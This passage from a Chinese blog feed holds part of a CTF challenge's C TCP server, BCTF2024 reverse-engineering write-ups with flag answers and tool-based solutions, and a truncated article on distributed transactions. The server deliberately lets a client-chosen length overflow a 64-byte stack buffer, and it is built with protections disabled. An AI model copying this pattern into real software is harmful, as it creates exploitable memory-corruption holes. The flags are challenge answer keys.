class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgets\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> client_sock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> magic<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"client_sock: %d\\n\"</span><span class=\"token punctuation\">,</span> client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\">// 读取 magic 字段</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>magic<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>magic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\">// 检查 magic 字段</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>magic <span class=\"token operator\">!=</span> MAGIC<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid magic number\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\">// 读取 size 字段</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>size<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\">// 读取 content 字段</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\">// 处理 content 字段</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Received content: %s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"68\"></td><td><pre> * @description</pre></td></tr><tr><td data-num=\"69\"></td><td><pre> * 实现一个服务器程序，使用 TCP 协议监听指定的端口，并处理来自客户端的连接请求。</pre></td></tr><tr><td data-num=\"70\"></td><td><pre> * 服务器会打印出 \"Server listening on port XXXX\"，其中 XXXX 是端口号，然后进入死循环等待客户端的连接。</pre></td></tr><tr><td data-num=\"71\"></td><td><pre> * 当有新的客户端连接时，服务器会调用 handle_client 函数处理该连接。</pre></td></tr><tr><td data-num=\"72\"></td><td><pre> * 如果发生错误，则输出相应的错误信息并退出程序。</pre></td></tr><tr><td data-num=\"73\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"74\"></td><td><pre> * @param &#123;boolean&#125; isClientConnected</pre></td></tr><tr><td data-num=\"75\"></td><td><pre> * 表示是否已经连接到了客户端，默认为 false。</pre></td></tr><tr><td data-num=\"76\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"77\"></td><td><pre> * @returns &#123;number&#125;</pre></td></tr><tr><td data-num=\"78\"></td><td><pre> * 返回一个整数，表示服务器监听的端口号。</pre></td></tr><tr><td data-num=\"79\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">int</span> server_sock<span class=\"token punctuation\">,</span> client_sock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> server_addr<span class=\"token punctuation\">,</span> client_addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token class-name\">socklen_t</span> client_addr_len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>client_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token comment\">// 创建套接字</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    server_sock <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>server_sock <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token comment\">// 绑定地址和端口</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_family <span class=\"token operator\">=</span> AF_INET<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_addr<span class=\"token punctuation\">.</span>s_addr <span class=\"token operator\">=</span> INADDR_ANY<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    server_addr<span class=\"token punctuation\">.</span>sin_port <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span>PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>server_addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>server_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token comment\">// 监听连接</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Server listening on port %d\\n\"</span><span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token comment\">// 接受客户端连接</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>client_sock <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>client_addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>client_addr_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token function\">handle_client</span><span class=\"token punctuation\">(</span>client_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-o</span> iot_challenge main.c -fno-stack-protector <span class=\"token parameter variable\">-z</span> execstack -no-pie <span class=\"token parameter variable\">-m32</span></pre></td></tr></table></figure></div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/reverse/",
            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/reverse/",
            "title": "BCTF2024-REVERSE",
            "date_published": "2024-09-26T09:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-reverse\"><a class=\"anchor\" href=\"#bctf2024-reverse\">#</a> BCTF2024-REVERSE</h1>\n<h2 id=\"查看bin文件\"><a class=\"anchor\" href=\"#查看bin文件\">#</a> 查看 bin 文件</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>猜猜 flag 藏在哪</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9vdXRwdXQuYmlu\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/output.bin</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{a2467320ce0f9bc6fda0a1f714e49933}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>直接编辑器打开 就能找到 flag</p>\n<p>或者 strings ouput.bin | grep flag</p>\n</div></details>\n<h2 id=\"app端硬编码\"><a class=\"anchor\" href=\"#app端硬编码\">#</a> app 端硬编码</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小洋是一名移动前端开发工程师，一天他和后端开发工程师在调试授权认证服务，之后就愉快的发布了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9hcHAtZGVidWcuYXBr\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/app-debug.apk</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{755bc1e8fe421b40fbb225cb47a01bdb}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\n# 安装 apktool\n# https://apktool.org/docs/install/\n\n# 解包\napktool d app-debug.apk\n\n\n# 翻一下路径，最后发现在\n# 路径 app-debug/smali_classes3/com/bctf2024/bctftest/MainActivity.smali\n\n# 有这么一行代码\nconst-string v4, &quot;ZmxhZ3s3NTViYzFlOGZlNDIxYjQwZmJiMjI1Y2I0N2EwMWJkYn0=&quot;\n\n解一下base64\n\n</code></pre>\n</div></details>\n<h2 id=\"代码还原\"><a class=\"anchor\" href=\"#代码还原\">#</a> 代码还原</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小浩是一名运维工程师，一次项目运维中，他误删除了一些脚本代码，看着缓存目录</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/__pycache__.zip</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{ffa04431e7c7a6b4959654ad082f74fb}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\npip3 install uncompyle6\n\nuncompyle6 -o . __pycache__/pluginbase.cpython-36.pyc\n\n</code></pre>\n</div></details>\n<h2 id=\"可执行文件反编译\"><a class=\"anchor\" href=\"#可执行文件反编译\">#</a> 可执行文件反编译</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小明写了个 python 小程序，为了防止代码泄漏，编译成了可执行文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC9tYWlu\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/main</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{30a859e0efdaaf31adc8ca8326a4f8ba}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>\npip3 install pyinstaller\n\nwget https://github.com/extremecoders-re/pyinstxtractor/blob/master/pyinstxtractor.py\n\npython3 pyinstxtractor.py main\n\ncd main_extracted\n\nuncompyle6 main.pyc &gt; main.py\n\n</code></pre>\n</div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/HighAvailability/distributed_transaction/",
            "url": "https://blog.twelveeee.top/2024/HighAvailability/distributed_transaction/",
            "title": "分布式事务",
            "date_published": "2024-08-04T16:30:00.000Z",
            "content_html": "<h1 id=\"分布式事务\"><a class=\"anchor\" href=\"#分布式事务\">#</a> 分布式事务</h1>\n<p>前言：<a href=\"https://blog.twelveeee.top/2024/HighAvailability/CAP_BASE/\">分布式 CAP 理论和 BASE 理论</a></p>\n<p><strong>强一致性</strong>：任何一次读都能读到某个数据的最近一次写的数据。在任意时刻，所有节点中的数据是一样的。</p>\n<p><strong>弱一致性</strong>：数据更新后，如果能容忍后续的访问只能访问到部分或者全部访问不到，则是弱一致性。</p>\n<p><strong>最终一致性</strong>：不保证在任意时刻任意节点上的同一份数据都是相同的，但是随着时间的迁移，不同节点上的同一份数据总是在向趋同的方向变化。</p>\n<h2 id=\"刚性事务\"><a class=\"anchor\" href=\"#刚性事务\">#</a> 刚性事务</h2>\n<p>CAP 中的 CP</p>\n<p>遵循 ACID，对数据要求强一致性</p>\n<h3 id=\"两阶段提交\"><a class=\"anchor\" href=\"#两阶段提交\">#</a> 两阶段提交</h3>\n<p>两阶段提交（2PC - Prepare &amp; Commit）</p>\n<p>第一阶段：准备阶段：<br />\n协调者向所有参与者发送  <code>REQUEST-TO-PREPARE</code> <br />\n 当参与者收到 <code>REQUEST-TO-PREPARE</code>  消息后，向协调者发送消息 <code>PREPARED</code>  或者 <code>NO</code> ，表示事务是否准备好；如果发送的是 <code>NO</code> ，那么事务要回滚；</p>\n<p>第二阶段：提交阶段：<br />\n协调者收集所有参与者的返回消息，如果所有的参与者都回复的是 <code>PREPARED</code> ， 那么协调者向所有参与者发送 <code>COMMIT</code>  消息；否则，协调者向所有回复 <code>PREPARED</code>  的参与者发送 <code>ABORT</code>  消息；<br />\n参与者如果回复了 <code>PREPARED</code>  消息并且收到协调者发来的 <code>COMMIT</code>  消息，或者它收到 <code>ABORT</code>  消息，它将执行提交或回滚，并向协调者发送 <code>DONE</code>  消息以确认。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408042354178.webp\" alt=\"image\" /></p>\n<h3 id=\"三阶段提交\"><a class=\"anchor\" href=\"#三阶段提交\">#</a> 三阶段提交</h3>\n<p>三阶段提交 ( <code>CanCommit</code> 、 <code>PreCommit</code> 、 <code>DoCommit</code> )</p>\n<p><strong>CanCommit</strong>：协调者向所有参与者发送 CanCommit 命令，询问是否可以执行事务提交操作。如果全部响应 YES 则进入下一个阶段。</p>\n<p><strong>PreCommit</strong>：协调者向所有参与者发送 PreCommit 命令，询问是否可以进行事务的预提交操作，参与者接收到 PreCommit 请求后，如参与者成功的执行了事务操作，则返回 Yes 响应，进入最终 commit 阶段。一旦参与者中有向协调者发送了 No 响应，或因网络造成超时，协调者没有接到参与者的响应，协调者向所有参与者发送 abort 请求，参与者接受 abort 命令执行事务的中断。</p>\n<p><strong>DoCommit</strong>：在前两个阶段中所有参与者的响应反馈均是 YES 后，协调者向参与者发送 DoCommit 命令正式提交事务，如协调者没有接收到参与者发送的 ACK 响应，会向所有参与者发送 abort 请求命令，执行事务的中断。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408042357228.png\" alt=\"img\" /></p>\n<p>3PC 是对 2PC 的一种升级优化，<strong>3PC 在 2PC 的第一阶段和第二阶段中插入一个准备阶段</strong>。保证了在最后提交阶段之前，各参与者节点的状态都一致。同时在协调者和参与者中都引入超时机制，当参与者各种原因未收到协调者的 commit 请求后，会对本地事务进行 commit，不会一直阻塞等待，解决了 2PC 的单点故障问题，但 3PC 还是没能从根本上解决数据一致性的问题。</p>\n<h2 id=\"柔性事务\"><a class=\"anchor\" href=\"#柔性事务\">#</a> 柔性事务</h2>\n<p>CAP 中的 AP</p>\n<p>遵循 BASE，允许一定时间内不同节点的数据不一致，但要求最终一致。</p>\n<h3 id=\"补偿事务tcc\"><a class=\"anchor\" href=\"#补偿事务tcc\">#</a> 补偿事务（TCC ）</h3>\n<p>TCC（Try-Confirm-Cancel）又被称补偿事务，TCC 与 2PC 的思想很相似，事务处理流程也很相似。</p>\n<p>TCC 它的<strong>核心思想</strong>是：针对每个操作都要注册一个与其对应的 Try 和 Cancel。</p>\n<p><strong>Try</strong> 阶段：尝试执行，完成所有业务检查（一致性）, 预留必须业务资源（准隔离性）<br />\n<strong>Confirm</strong> 阶段：确认执行真正执行业务，不作任何业务检查，只使用 Try 阶段预留的业务资源，Confirm 操作满足幂等性。要求具备幂等设计，Confirm 失败后需要进行重试。<br />\n<strong>Cancel</strong> 阶段：取消执行，释放 Try 阶段预留的业务资源 Cancel 操作满足幂等性 Cancel 阶段的异常和 Confirm 阶段异常处理方案基本上一致。</p>\n<h3 id=\"saga事务\"><a class=\"anchor\" href=\"#saga事务\">#</a> SAGA 事务</h3>\n<p>Saga 是由一系列的本地事务构成。每一个本地事务在更新完数据库之后，会发布一条消息或者一个事件来触发 Saga 中的下一个本地事务的执行。如果一个本地事务因为某些业务规则无法满足而失败，Saga 会执行在这个失败的事务之前成功提交的所有事务的补偿操作。</p>\n<h3 id=\"本地消息表\"><a class=\"anchor\" href=\"#本地消息表\">#</a> <strong>本地消息表</strong></h3>\n<p>核心思路是将分布式事务拆分成本地事务进行处理。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408050012899.png\" alt=\"image-20240805001206162\" /></p>\n<ol>\n<li>当系统 A 被其他系统调用发生数据库表更操作，首先会更新数据库的业务表，其次会往相同数据库的消息表中插入一条数据，两个操作发生在同一个事务中</li>\n<li>系统 A 的脚本定期轮询本地消息往 mq 中写入一条消息，如果消息发送失败会进行重试</li>\n<li>系统 B 消费 mq 中的消息，并处理业务逻辑。如果本地事务处理失败，会在继续消费 mq 中的消息进行重试，如果业务上的失败，可以通知系统 A 进行回滚操作</li>\n</ol>\n<p>本地消息表实现的<strong>条件</strong>：</p>\n<ol>\n<li>消费者与生成者的接口都要支持幂等</li>\n<li>生产者需要额外的创建消息表</li>\n<li>需要提供补偿逻辑，如果消费者业务失败，需要生产者支持回滚操作</li>\n</ol>\n<p><strong>容错机制</strong>：</p>\n<ol>\n<li>步骤 1 失败时，事务直接回滚</li>\n<li>步骤 2、3 写 mq 与消费 mq 失败会进行重试</li>\n<li>步骤 3 业务失败系统 B 向系统 A 发起事务回滚操作</li>\n</ol>\n<p><strong>实际应用：</strong></p>\n<p>比如订单状态变更之后，会见消息记录写入 mq，消费者消费消息，触发事件，给用户发短信等等。</p>\n<h3 id=\"mq事务\"><a class=\"anchor\" href=\"#mq事务\">#</a> MQ 事务</h3>\n<p>实际上是对本地消息表的一个封装，将本地消息表移动到了 MQ 内部。</p>\n<h3 id=\"最大努力通知\"><a class=\"anchor\" href=\"#最大努力通知\">#</a> 最大努力通知</h3>\n<p>最大努力通知也称为定期校对，是对 MQ 